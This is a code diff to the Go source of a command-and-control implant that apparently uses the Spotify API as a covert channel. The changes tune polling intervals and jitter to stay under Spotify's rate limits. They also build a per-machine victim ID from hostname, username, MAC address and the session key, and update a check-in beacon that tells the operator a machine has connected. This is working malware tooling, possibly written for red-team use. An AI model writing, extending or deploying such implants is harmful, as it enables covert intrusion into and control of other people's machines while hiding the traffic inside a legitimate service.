@@ -30,16 +30,15 @@ type Implant struct {
 // NewImplant creates a new implant.
 func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
 	// Enforce minimum 20s interval to avoid Spotify rate limits
-	// (~180 req/30s rolling window, optimized to ~2 API calls per poll)
 	if interval < 20 {
 		fmt.Printf("[!] Interval %ds too low, setting to 20s "+
 			"(Spotify rate limit: ~180 req/30s)\n", interval)
 		interval = 20
 	}
-	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
 	if jitter >= interval {
 		jitter = interval / 2
 	}
+	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
 	return &Implant{
 		client:        client,
 		key:           key,
@@ -49,9 +48,11 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	}
 }
 
-// getClientID returns Adler32 hash of hostname+user+MAC for a stable,
-// unique-per-machine identifier regardless of IP changes.
-func getClientID() string {
+// getClientID derives a unique client ID from the encryption key +
+// machine identity (hostname, user, MAC). The key component ensures
+// different operator sessions produce different IDs. The machine
+// component ensures different machines are distinguishable.
+func getClientID(encryptionKey string) string {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
 	if username == "" {
@@ -71,14 +72,14 @@ func getClientID() string {
 		}
 	}
 
-	seed := hostname + "|" + username + "|" + mac
+	seed := encryptionKey + "|" + hostname + "|" + username + "|" + mac
 	return fmt.Sprintf("%08x", adler32.Checksum([]byte(seed)))
 }
 
 // sendCheckin sends a check-in beacon so the operator knows we connected.
 func (imp *Implant) sendCheckin() {
 	ctx := context.Background()
-	clientID := getClientID()
+	clientID := getClientID(imp.key)
 
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
